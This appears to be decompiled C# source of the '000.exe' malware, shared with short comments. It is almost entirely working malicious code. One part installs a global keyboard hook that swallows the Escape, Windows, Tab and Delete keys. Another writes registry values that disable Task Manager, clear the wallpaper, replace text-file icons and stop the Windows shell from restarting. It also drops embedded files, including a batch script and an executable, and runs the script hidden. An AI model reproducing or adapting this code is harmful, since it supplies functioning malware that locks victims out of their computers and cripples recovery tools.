//decomilation of 000.exe malware made by FlyTech
//written in C# decompiled with .NET Reflector

public MainWindow()
{
    Console.WriteLine("beginning!");
    this.gkh = new GlobalKeyboardHook();
    this.gkh.HookedKeys.Add(Keys.Escape);
    this.gkh.HookedKeys.Add(Keys.LWin);
    this.gkh.HookedKeys.Add(Keys.RWin);
    this.gkh.HookedKeys.Add(Keys.Tab);
    this.gkh.HookedKeys.Add(Keys.Delete);
    this.gkh.KeyDown += new KeyEventHandler(this.handleKey);
    this.gkh.hook();
    this.WorkWorkWorkWork();
    this.InitializeComponent();
}

 public void InitializeComponent()
{
    if (!this._contentLoaded)
    {
        this._contentLoaded = true;
        Uri resourceLocator = new Uri("/000;component/mainwindow.xaml", UriKind.Relative);
        Application.LoadComponent(this, resourceLocator);
    }
}

//function used to indicate the end of the display video
private void MediaElement_MediaEnded(object sender, RoutedEventArgs e)
{
    MediaElement element = sender as MediaElement;
    element.Position = TimeSpan.FromMilliseconds(1.0);
}
 
 //connects video to event trigger
 void IComponentConnector.Connect(int connectionId, object target)
{
    switch (connectionId)
    {
        case 1:
            this.main = (MainWindow) target;
            this.main.PreviewKeyDown += new KeyEventHandler(this.main_PreviewKeyDown);
            break;

        case 2:
            this.video = (MediaElement) target;
            this.video.Loaded += new RoutedEventHandler(this.video_Loaded);
            this.video.MediaEnded += new RoutedEventHandler(this.MediaElement_MediaEnded);
            break;

        default:
            this._contentLoaded = true;
            break;
    }
}
 //loads video into memory
  private void video_Loaded(object sender, RoutedEventArgs e)
{
    string path = Path.GetTempPath() + "v.mp4";
    File.WriteAllBytes(path, Resources.street);
    this.video.Source = new Uri(path);
}

//one of the larger payloads
//disables task manager, changes wallpaper, restarts computer, text file icons are replaced
public void WorkWorkWorkWork()
{
    string tempPath = Path.GetTempPath();
    File.WriteAllBytes(tempPath + "icon.ico", Resources.texticon);
    RegistryKey key = Registry.ClassesRoot.CreateSubKey(@"txtfile\DefaultIcon");
    key.SetValue("", tempPath + "icon.ico");
    key.Close();
    key = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
    key.SetValue("Wallpaper", "");
    key.Close();
    key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
    key.SetValue("DisableTaskMgr", "1");
    key.Close();
    key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
    key.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
    key.Close();
    File.WriteAllBytes(tempPath + "text.txt", Resources.txt);
    File.WriteAllBytes(tempPath + "windl.bat", Resources.windl);
    File.WriteAllBytes(tempPath + "one.rtf", Resources.one);
    File.WriteAllBytes(tempPath + "rniw.exe", Resources.subox);
	//starts batch file
    ProcessStartInfo startInfo = new ProcessStartInfo(tempPath + "windl.bat") {
        CreateNoWindow = true,
        UseShellExecute = false
    };
    Process.Start(startInfo);
}
 

 //keyboard hook-----------------------
 
 public GlobalKeyboardHook()
{
    this.HookedKeys = new List<Keys>();
    this.hhook = IntPtr.Zero;
    this.hook();
}
//----------------------------------------
  public void hook()
{
    IntPtr hInstance = LoadLibrary("User32");
    this.hhook = SetWindowsHookEx(13, new keyboardHookProc(this.hookProc), hInstance, 0);
}

private void handleKey(object sender, KeyEventArgs e)
{
    e.Handled = true;
}


private void main_PreviewKeyDown(object sender, KeyEventArgs e)
{
    e.Handled = true;
}

//key down ------------------------------
public void add_KeyDown(KeyEventHandler value)
{
	//keyDown = 0x100
    KeyEventHandler handler2;
    KeyEventHandler keyDown = this.KeyDown;
    do
    {
        handler2 = keyDown;
        KeyEventHandler handler3 = (KeyEventHandler) Delegate.Combine(handler2, value);
        keyDown = Interlocked.CompareExchange<KeyEventHandler>(ref this.KeyDown, handler3, handler2);
    }
    while (keyDown != handler2);
}

public void remove_KeyDown(KeyEventHandler value)
{
    KeyEventHandler handler2;
    KeyEventHandler keyDown = this.KeyDown;
    do
    {
        handler2 = keyDown;
        KeyEventHandler handler3 = (KeyEventHandler) Delegate.Remove(handler2, value);
        keyDown = Interlocked.CompareExchange<KeyEventHandler>(ref this.KeyDown, handler3, handler2);
    }
    while (keyDown != handler2);
}

//key up-----------------------------
public void add_KeyUp(KeyEventHandler value)
{
	//keyUp = 0x101
    KeyEventHandler handler2;
    KeyEventHandler keyUp = this.KeyUp;
    do
    {
        handler2 = keyUp;
        KeyEventHandler handler3 = (KeyEventHandler) Delegate.Combine(handler2, value);
        keyUp = Interlocked.CompareExchange<KeyEventHandler>(ref this.KeyUp, handler3, handler2);
    }
    while (keyUp != handler2);
}

public void remove_KeyUp(KeyEventHandler value)
{
    KeyEventHandler handler2;
    KeyEventHandler keyUp = this.KeyUp;
    do
    {
        handler2 = keyUp;
        KeyEventHandler handler3 = (KeyEventHandler) Delegate.Remove(handler2, value);
        keyUp = Interlocked.CompareExchange<KeyEventHandler>(ref this.KeyUp, handler3, handler2);
    }
    while (keyUp != handler2);
}



int hookProc(int code, int wParam, ref keyboardHookStruct lParam)
{
    if (code >= 0)
    {
        Keys vkCode = (Keys) lParam.vkCode;
        if (this.HookedKeys.Contains(vkCode))
        {
            KeyEventArgs e = new KeyEventArgs(vkCode);
            if (((wParam == 0x100) || (wParam == 260)) && (this.KeyDown > null))
            {
                this.KeyDown(this, e);
            }
            else if (((wParam == 0x101) || (wParam == 0x105)) && (this.KeyUp > null))
            {
                this.KeyUp(this, e);
            }
            if (e.Handled)
            {
                return 1;
            }
        }
    }
    return CallNextHookEx(this.hhook, code, wParam, ref lParam);
}

public void unhook()
{
    UnhookWindowsHookEx(this.hhook);
}

 

 



 


 




 
